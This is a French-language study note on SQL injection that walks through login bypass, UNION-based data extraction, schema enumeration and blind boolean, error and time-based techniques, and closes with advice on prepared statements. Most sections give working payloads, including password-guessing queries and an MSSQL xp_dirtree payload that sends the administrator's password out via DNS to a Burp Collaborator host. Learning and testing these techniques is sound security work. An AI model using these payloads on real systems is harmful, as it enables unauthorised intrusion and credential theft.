# Introduction aux injections SQL

Voir #ServerSideVulnerabilites pour une introduction plus complète.
Les injections SQL se basent sur le fait qu'une entrée utilisateur ne soit pas sanitizée avant d'exécuter une requête.

On passe d'une requête initiale I
```sql
select *
from t
where col = $var;
```
Avec `$var` une variable d'entrée utilisateur à I'
```sql
select *
from t
where col = '' or 1=1;--';
```
Cette transformation est possible avec `$var = ' or 1=1;--`, qui coupe la terminaison de string plus tôt et exécute le code sql tout en discardant le reste de la requête via des commentaires.
L'injection se fait donc sur la base d'usage des strings UNIQUEMENT.

> **Certains SGBD utilisent # comme commentaires. L'usage de # dans une url ne marche pas ! Voir la cheatsheet** https://portswigger.net/web-security/sql-injection/cheat-sheet
> MySQL est particulièrement capricieux.

> **Hyper méga important : la requête SQL injectée peut être limitée à une taille maximale d'input au préalable ! Si la requête dépasse, elle sera tronquée et la requête ne sera pas exécutée !!!!!**
### Détecter une injection SQL

Les chaînes problématiques dans une injection SQL sont
- `'` : marqueur de string
- `or 1=1` ou `or 1=2` qui valident ou ajoutent un booléen nécessaire
- Des payloads spécifiques qui exécutent du SQL tel quel. Tout est trouvable dans burp scanner.

On trouve des éléments exploitables selon la requête dans...
- Clause `update` : dans la valeur mise à jour ou la clause `where`
```sql
update t
set col1 = $var1, col2 = $var2 -- points d'entrée
where col = $var3 -- point d'entrée
```
- Clause `insert` : dans les valeurs insérées
```sql
insert into t (col1, col2) values ($var1, $var2), ($var3, $var4), ...
```
- Clause `delete` : dans la condition
```sql
delete from t
where col = $var -- point d'entrée
```
- Clause `select` : dans le nom de la table, colonne, dans une clause where, order by, ...
```sql
select *
from $var
join $var on ($var = $var2) -- ou using($var)
where col = $var
group by $var
having $var
order by $var
limit 1 -- le 1er résultat
```

Ces variables peuvent provenir de formulaires, mais aussi de variables `GET` comme par exemple
`url.com?category=$var`, la catégorie étant la variable d'entrée utilisateur.
### Récupérer des données cachées

Si la requête n'est pas préparée et qu'on peut rentrer ce qu'on veut, on peut passer d'une requête initiale
```sql
select * from products where category = $var and released = 1;
```
à
```sql
select * from products where category = '' or 1=1;--' and released = 1;
```
avec `$var = ' or 1=1;--`, soit en accédant à `url.com?cateogry=' or 1=1;--`. L'accès de l'url via un navigateur va encoder l'url pour être URI-friendly.

On bypass le reste de la condition et on obtient le sésame.
### Bypass de logique

Comme au dessus, le but du bypass de logique est d'omettre certaines vérifications. L'ordre déclaré dans la requête a de l'importance :
```sql
-- Ne peut pas bypass colEntier
select * from t where (colEntier = $var1) and (colString = $var2);

-- Peut bypass colEntier si $var1 = ' or 1=1;--
select * from t where (colString = $var1) and (colEntier = $var2);
```
Bien que si les colonnes stockent des strings et que les variables peuvent être injectées telles quelles, ça n'a pas d'importance.

On note que ce cas n'est pas vrai si les parenthèses sont omises car
```sql
select * from t where colEntier = $var1 and colString = $var2;
select * from t where colString = $var1 and colEntier = $var2;
```
n'auraient aucune priorisation, donc `colEntier = $var1 and colString = '' or 1=1;` serait true car on aurait `ab + true = true` en algèbre booléenne.

> **L'ordre des variables a une importance ssi il y a des parenthèses**

Dans le cadre d'un username et d'un password dans un login, on tombe exactement dans le cas où le point d'entrée n'importe peu car l'un dans l'autre, on peut pirater les deux chaînes.

On a
```sql
select * from users where user = $user and password_hash = $hash
```
Ici, le plus simple est de pirate `$user`. Par symétrie, si la vérif sur `$hash` était en premier, alors on pirate ce champ d'accès car les deux sont des strings !

Pour se login dans un compte particulier, il faut tout-de-même donner une valeur, donc on aurait
`$user = administrator' or 1=1--` afin de filtrer pour ne garder que le compte administrator.
# Déterminer le schéma de la base

Manipuler une DB est drôle, mais on se retrouve vite limité. Il faudrait réussir à savoir combien de colonnes une table contient.
### Compter les colonnes
#### Par la clause order-by

L'usage de la clause `order by` permet d'ordonner les valeurs selon une colonne. Son usage traditionnel se fait via le nom de la colonne
```sql
select * from t order by col
```
Cependant, on peut aussi utiliser son indice de position à la définition de la table
```sql
select * from t order by 2 -- 2 = une certaine colonne
```

L'idée est de truander la requête pour ajouter cet order by, et voir jusqu'à quel valeur ça marche avant que ça plante. On aurait donc
```sql
select * from t where col = $var
```
qui devient
```sql
select * from t where col = '' or 1=1 order by 1--'
```
avec `$var = ' or 1=1 order by 1`. Il faut changer la valeur du `order by`, et dès que ça plante on a dépassé le nombre de colonnes.
#### Par les unions
Les unions permettent de produire un ensemble `C` contenant deux ensembles issues de requêtes `A` et `B` tel que `C = A u B`.
La syntaxe est simple:
```sql
select a, b, c from t
union
select d, e, f from t2
```
Il faut que le nombre de colonnes soit **identique** entre le premier select et le 2e, et que les types de données matchent/soient castables.

Parce que le nombre de colonnes doit matcher, on peut imaginer une requête
```sql
select * from t where col = $var
```
Pour arriver à déterminer le nombre de colonnes, on peut bypass la condition afin d'injecter un union pour produire
```sql
select * from t where col = '' or 1=1 union select null, null, ..., null--'
```
via `$var = ' or 1=1 union select null, null, ..., null--`. Le nombre de `null` indique le nombre de colonnes.
Cependant, cette technique peut poser des problèmes avec les types de données, car l'union doit aussi avoir une concordance des types selon les colonnes. Ce mécanisme peut être utile pour deviner les types.

> Sur les DB Oracle, on ne peut pas faire `select null`, il faut faire `select null from dual`. Voir le site https://portswigger.net/web-security/sql-injection/cheat-sheet pour plus de cheatcodes.
### Deviner les types de données

L'exploration des types de données se fait via la technique des unions. Cependant cette exploration est difficile selon le nombre de colonnes.
D'abord il faut avoir le **bon nombre de colonnes**. Ensuite il faut faire pivoter un **unique** type de données à la fois :
```sql
... union select 'a', null, null
... union select null, 'a', null
... union select null, null, 'a'
```
Ce pivot permet d'identifier le type de données d'une colonne.
- Si aucune erreur, la colonne contient un type compatible au niveau d'un CAST. La valeur entière `1` serait castée en string par `'1'`, et inversement. Donc on choisit une lettre, une phrase. Essayer avec `'1'` ne donnera pas d'erreur sur les colonnes à entier.
- S'il y a une erreur, le type de données ne correspond pas à la valeur choisie
- S'il y a des erreurs sur toutes les colonnes, le type de données ne matche pas avec `string`. On peut essayer d'insérer des `'1'` ou des dates par la suite car on sait qu'aucune colonne ne serait un string.

> Malgré l'histoire des clés étrangères ou `check` qui contraindraient une valeur de string, un union n'est généralement pas sujet à ces contraintes.
# Piquer des données d'autres colonnes

Encore une fois, le keyword `union` permet d'unioner plusieurs tables. En bidouillant et en ayant une **bonne connaissance du schéma de table**, on peut essayer d'unioner une table injectable avec une autre, en positionant l'ordre des colonnes de manière cohérente selon la table injectable.
```sql
select unEntier, unString from t
union
select 1, 'a'
```
serait une union correcte. Cependant pourquoi ne pas le faire depuis une vraie table?
```sql
select unEntier, unString from t
union
select col1, col2 from t2
```
Où `t2` serait une table externe à la requête. Si jamais un union aurait un schéma insatisfaisable par `t`, on peut bidouiller.
Si `t` a trop de colonnes par rapport à `t2` :
```sql
select int, varchar, int, int, int, varchar from t
union
select field1, field2, 1, 1, 1, field3 from t2
```
On a donc rajouté des valeurs subsidiaires pour satisfaire au schéma. On peut rajouter `null` aussi, histoire de ne pas s'embêter avec les types.
Le cas échant, on peut penser à des techniques de réduction. Voir la prochaine section.

Pour obtenir le schéma, les différents SGBD donnent des tables par défaut permettant de décrire le schéma.

La méthode `cast()` permet de forcer un type, si nécessaire. 
### Techniques utiles pour garder la blinde de valeurs

Le schéma des tables ne joue pas en notre faveur. C'est pourquoi certaines opérations primaires permettent de facilement bundler des valeurs.
N'oublions par l'existence de :
- `to_char()` qui cast en string
- `||` qui fait de la concaténation.

Ainsi, une table compliquée n'ayant qu'un unique string peut servir de point d'entrée pour récupérer une multitude de strings :
```sql
select varchar from t
union
select to_char(col1) || ' ~ ' to_char(col2) || ' ~ ' || to_char(col3) ... from t2
```
En une seule case, plusieurs colonnes on été récupérées.
Le casting de string en autre est compliqué. L'inverse cependant est quasiment garanti. Cette technique rend bien plus facile l'acquisition de valeurs.
# Métadonnées sur la DB

Les DBs disposent de méthodes pour obtenir les métadonnées.

| DB               | Méthode   |
| ---------------- | --------- |
| Microsoft, MySQL | @@version |
| Oracle           | v$version |
| PostgreSQL       | version() |

Ces méthodes renvoient un unique string. On obtient
```sql
select version()
```

On peut essayer de caler ça dans une injection histoire de voir le moteur SGBD à l'aide d'une union. Il faut bien penser à la concordance des types.

Plusieurs DBs (sauf Oracle évidemment, mais il me semble que y'a d'autres méthodes) contiennent une vue `information_schema.tables` sous la forme
```sql
table information_schema.tables(
	table_catalog varchar not null, -- DV
	table_schema varchar not null, -- Schéma
	table_name varchar not null, -- Nom de table
	table_type varchar not null -- Type de table
)
```
On peut select dessus et obtenir les tables d'une db entière.
De ce fait, on peut aussi obtenir les colonnes d'une table avec
```sql
table information_schema.columns(
	table_catalog varchar not null, -- DB
	table_schema varchar not null, -- Schéma
	table_name varchar not null, -- Nom de table mère
	column_name varchar not null, -- Nom de colonne
	data_type varchar not null -- Type de données (int, varchar, ...)
)
```
Il faut évidemment contraindre le nom de table souhaité !

Oracle utilise d'autres tables, notamment `all_users`, en se basant sur qui à créé quoi.
# Injections SQL à l'aveugle (blind SQLi)

Ces injections correspondent à des attaques SQLi ne mettant pas en évidence une quelconque réponse reçue du SGBD : on ne voit pas l'effet que l'injection au eu immédiatement.
Ainsi, les attaques de type `union` ne sont pas utilisables car on ne peut pas voir s'il y a eu une erreur, ou voir le contenu reçu.

On peut penser à des cookies analytiques. Le cookie est stocké côté client et est récupéré par le serveur. Le serveur vérifie si le cookie est bien dans la base au préalable, mettant en oeuvre une query attaquable 
```sql
select id from tracked_users where id = $tracking_cookie_id
```
Avec `$tracking_cookie_id` le contenu du cookie de l'entête de la requête HTTP initiale.
Le résultat d'une telle requête n'est pas renvoyé à l'utilisateur sur l'interface : on ne sait pas si l'injection s'est bien produite.

Malgré le manque de réponse, l'injection a peut-être réussi. Ce type d'injection reste donc utilisable, bien que plus difficile. La chasse à l'information pour déterminer si quelque chose s'est produit reste juste plus compliquée.
### Par logique

On peut trafiquer une requête avec
```sql
.(query A). and 1=1
```
et
```sql
.(query A). and 1=2
```
pour essayer de déterminer si un élément visuel changerait. La 1re pourrait provoquer un affichage différent de la 2e requête de par l'évaluation n'étant pas la même.

Une fonction vachement utile reste `substring()` (ou `substr()`):

| SGBD   | Fonction                   |
| ------ | -------------------------- |
| Oracle | `substr(str, start, n)`    |
| Autre  | `substring(str, start, n)` |

Cette fonction coupe le string depuis start jusque start + n (exclus).
> `substring('Bonsoir', 2, 4) = on`

Du coup, on peut lancer une sous-requête qui **produit une unique cellule** pour pouvoir utiliser les opérateurs.

**Rappel :** 
```sql
... where col = (select id from t where col = uniqueValue);
```
La sous-requête produit une unique cellule résultat. De ce fait, on peut utiliser tous les opérateurs classiques (`=`, `>`, ...). Il faut bien faire attention au select car `select *` peut produire plusieurs colonnes !
Pour rappel, dès lors qu'il y a plusieurs cellules, on ne peut pas utiliser ces opérateurs, uniquement `in`.
Si on veut juste produire une case sans qu'elle vienne d'une table, il faut utiliser la table dummy `dual`.

Ainsi, on peut essayer de guess les informations. S'il y a un affichage conditionnel selon le résultat de la query, et qu'on veut deviner un mot-de-passe, on peut imaginer quelque chose comme suit :

1. La 1re lettre du mdp du compte "admin" va au delà de `m` <=> le message est affiché sur la page.
```sql
... and (select substring(password, 1, 1) from users where name = 'admin') >= 'm'
```

2. La 1re lettre du mdp du compte admin est avant `t` <=> le message n'est PAS affiché sur la page.
```sql
... and (select substring(password, 1, 1) from users where name = 'admin') >= 't'
```

3. La 1re lettre du mdp du compte admin est `s` <=> le message est affiché sur la page.
```sql
... and (select substring(password, 1, 1) from users where name = 'admin') = 's'
```

> **Rq :** Dans le cadre d'une requête unicellulaire, faire `(select func(col) ...)` et `func((select col ...))` est identique !

Évidemment, il faut que toute la condition issue du `...` produise un résultat vrai histoire de moduler la valeur booléenne avec notre condition. Il faut aussi pouvoir vérifier que la validité de la condition `...` originelle provoque une différence d'affichage. Si c'est le cas, on simule `...` constant (= on lui donne une valeur qui provoque un affichage particulier) et la condition qu'on injecte va déterminer cet affichage, et donner des informations.

/!\ : Pour rappel, les SGBD peuvent être insensibles à la casse selon la collation appliquée !!!
Pour régler le problème, on peut abstraire la casse via `ascii()` qui renvoie le code ascii.

Quelques fonctions utiles...
- `substring(str, start, n)` : coupe str de start à n-1
- `ascii(char)` : renvoie le code ascii associé à char
- `length(str)/len(str)` : renvoie la longueur d'str
...
### Par erreurs émises

Comme certaines configurations de SGBD **et** de serveurs webs, les erreurs SQL peuvent être forwardées au client. Ces erreurs peuvent donner des informations sur la structure de la DB de par leur présence (erreur conditionnelle) et de par le message d'erreur obtenu (s'il y en a un).
Dans le cas de la technique des `union`, l'affichage d'une erreur permet de déterminer que le nombre de colonnes, ou le type induit est incorrect.

Cependant, certaines applications SQL ne changent pas l'affichage au dépend du résultat de la query. Ainsi, aucun indicateur visuel ne permet de conditionnaliser une requête pour déterminer un vecteur d'attaque. Dans ce cas, on peut s'aider des erreurs. La vaste majorité des applications vont vraiment provoquer une différence sur la page si une erreur SQL se produit, donc on peut se baser sur une query juste et faire provoquer une erreur pour en déduire des infos.

Pour provoquer une erreur, on peut par exemple faire :
```sql
... and case when (1=2) then 1/0 else 'a' -- valeur 'a' retournée
... and case when (1=1) then 1/0 else 'a' -- valeur NaN retournée, exception levée
```

En reprenant l'exploration, on peut donc faire provoquer une erreur sur la page si aucun indice visuel n'est visible, en rajoutant un tel contenu.

La query qui devine la 1re lettre d'un mdp
```sql
... and (select substring(password, 1, 1) from users where name = 'admin') = 's'
```
deviendrait
```sql
... and (select case when (substring(password, 1, 1) = 's') then 1/0 else 'no' end from users where name = 'admin') = 'no'
```
- Si la 1re lettre est 's', alors on compare NaN à un string.
- Si la 1re lettre n'est pas 's', alors on a 'no' comparé à 'no' qui est vrai, la query s'est déroulée comme prévu.

La technique réside dans le fait de pouvoir provoquer une erreur dès que quelque chose a été remarqué, ou inversement. J'aurais pu ne pas provoquer d'erreur dès que la 1re lettre a été trouvée et en provoquer une le cas échant.

Il y a plusieurs manières d'exploiter les erreurs, certaines étant privilégiées sur d'autres selon le contexte.

On note les formes selon le SGBD :

| SGBD       | Méthode                                                                    | Remarque                                                                                                                                     |
| ---------- | -------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------- |
| Oracle     | `(select case when (cond) then to_char(1/0) else 'a' end from dual) = 'a'` | Utiliser `1/0` sans `to_char` provoque une erreur dans tous les cas. Il faut que le type de donnée retourné dans tous les cas soit le même ! |
| Microsoft  | `(select case when (cond) then 1/0 else null end)`                         | On peut renvoyer null tel quel a priori, sans avoir besoin de comparaison subséquente                                                        |
| PostgreSQL | `1 = (select case when (cond) then 1/(select 0) else null end)`            | On a besoin de générer `1/(select 0)` car sinon le SGBD n'est pas forcé à exécuter un tel code malicieux                                     |
| MySQL      | `select if(cond, (select table_name from information_schema.tables), 'a')` | L'erreur se base sur la multiplicité  des tables du schéma selon `if(cond, true, false)`                                                     |

Lors de l'apparition de messages verbeux, des informations substantielles peuvent apparaître permettant une récupération d'informations. Très souvent, cela révèle la requête complète.
Ce comportement peut se vérifier très simplement en injectant un unique `'` tq
```sql
select ... from ... where col = '''
```
Une erreur serait produite pour string malformé.

Pour déterminer le type des colonnes, la méthode `cast(value as type)` permet de challenger le SGBD dans le typage et obtenir un message d'erreur donnant la valeur employée dans le cast.
### Par délai de réponse

Parfois, les messages d'erreurs ne sont pas disponibles. Dans ce cas, une méthode qui détermine si une requête marche consiste à utiliser le délai de réception de la requête SQL.
La majorité du temps, le code métier est synchrone avec le SGBD par souci d'obtention de valeurs.
```php
// Synchrone
$content = Person::find($id);
print($content);
```

En s'inspirant de la technique du dessus, on peut provoquer un délai de réponse lors de certains cas de figure, là où il n'y aurait aucun délai selon les autres cas.
Le but n'est plus forcément de provoquer une erreur, mais de montrer qu'une query spécifique prend un temps très long et provoque une réception de réponse très longue, là où les autres prennent un temps classique :
```sql
-- Sur MSSQL
; if (1=2) waitfor delay '00:00:10' -- Aucun délai, condition fausse
; if (1=1) waitfor delay '00:00:10' -- Délai, condition vraie
```
Il vaut mieux mettre le délai sur la vraie condition histoire de limiter les temps d'attente lors de bruteforces !

On peut donc reprendre la méthode des erreurs mais espérer un délai
```sql
; if (select count(username) from users where username = 'administrator' and substring(password, 1, 1) > 'm') = 1 waitfor delay '00:00:10'--
```
On peut noter que cette technique se fait dans une autre requête séparée ! On peut la bundler dans une requête normale ceci étant dit.

En reprenant l'exemple des mots-de-passes
```sql
...; select case when substring(password, 1, 1) = 'm' then pg_sleep(5) else pg_sleep(0) end from users where username = 'admin'
```
Cette technique suppose l'appending de plusieurs requêtes, ce qui est souvent désactivé dans les librairies modernes.

Si ça n'est pas dispo, pas de panique ! On peut faire ça dans un `where`
```sql
... and (select case when substring(password, 1, 1) = 'm' then pg_sleep(5) else pg_sleep(0) end from users where username = 'admin') is null
```

La nécessité de `is null` se justifie pour éviter le type mismatch. Cela produit un booléen, car `null` n'est pas évaluable comme tel.

| SGBD       | Méthode                                                                                              |
| ---------- | ---------------------------------------------------------------------------------------------------- |
| Oracle     | `select case when (cond) then 'a' \|\| dbms_pipe.receive_message(('a'), 10) else null end from dual` |
| Microsoft  | `if (cond) waitfor delay '0:0:10'`                                                                   |
| PostgreSQL | `select case when (cond) then select pg_sleep(10) else pg_sleep(0) end`                              |
| MySQL      | `select if (cond, select sleep(10), 'a')`                                                            |
### Par requêtage externe (OAST)

Dans un cas où la query serait lancée en parallèle, et où aucune solution spécifique n'est satisfaisable, il est possible de trouver une solution : faire exécuter une requête par le SGBD qui sort de son scope. Le plus utilisé est de faire du DNS lookup sur des services que nous avons déclaré.

Ils ont envie de nous vendre Burp suite pro et leur système collaborator, mais on ne va pas l'acheter.

Par exemple, sur MSSQL
```sql
; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
```
Le SGBD va faire un DNS lookup sur le domaine `0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net`.

Pour la suite des événements, dès lors qu'un signal a été reçu, on peut extraire des informations
```sql
; declare @p varchar(1024) -- déclare un varchar nommé p
; set @p=(select password from users where username = 'administrator') -- assigne la cellule unitaire dans p
; exec('master..xp_dirtree "//' + @p + '.0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a"') -- Fait un dns lookup d'url
--
```
Le but est de générer l'url `<password>.0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a` et de vérifier sur le lookup le premier membre, correspondant au mdp !

Cette syntaxe peut varier d'un SGBD à l'autre.
# Injections selon le contexte

Les injections SQL peuvent être partout ! On a vu
- Dans un input html
- Dans l'url en GET
- Dans les entêtes HTML
- Dans une requête POST

Mais elles peuvent être partout... Dans du json, du xml, ...
En JSON
```json
{
	request: "apply-form",
	data: "' union select user, password from users--"
}
```
En XML
```xml
<main>
	<productId>95686</productId>
	<storeId>999 select * from information_schema.tables--</storeId>
</main>
```

Des mécanismes de vérification peuvent subsister et enlever ces keywords. Cependant selon le format, certaines techniques de preprocessing peuvent donner lieu à des choses intéressantes. Par exemple, le `s` en XML peut se faire via les entités, en l'occurrence `&#x73;`, passant à
```xml
<storeId>999 &#x73;elect * from information_schema.tables--</storeId>
```
Ce processing permet d'évader les systèmes de vérification !

On peut penser à des extensions telles `Hackvertor` pour facilement convertir les éléments en entités.
# Injections SQL de second ordre

Les injections SQL vues se basent sur un point d'entrée, provoquant une attaque immédiate. Une autre approche consiste à insérer une valeur malicieuse afin qu'elle soit stockée en DB. Le but n'est pas d'exécuter une injection immédiatement mais de trouver un point d'entrée plus tard.

Souvent ces techniques sont utiles si le point d'insertion est protégé, mais pas le reste du code :
```php
prepare("insert into users values(:user, :pass_hash)").bind(":user", $user).bind(":pass_hash", hash($pass))
```
Ici, le code est sécurisé. Cependant, la préparation n'altère pas la chaîne originelle, elle dit à SQL que cette chaîne est un string, mais elle est insérée telle quelle.

Ainsi, d'autres futurs lookups peuvent poser des problèmes :
```php
$username = get(...); // Récupère le username
$req = "select * from users where username = $username" // Injecte directement le username
```

Dans ce contexte, le username récupéré est injecté directement. Cette query se justifiait car l'insertion étant sécurisée, pourquoi est-ce que l'usage après insertion sécurisée serait mauvais?
# Comment régler le problème

**Toujours** préparer les requêtes si la source de la variable vient de l'extérieur. Une variable en db qui historiquement a été insérée depuis l'extérieur PROVIENT de l'extérieur.

L'usage d'un ORM permet également de faire ces préparations automatiquement.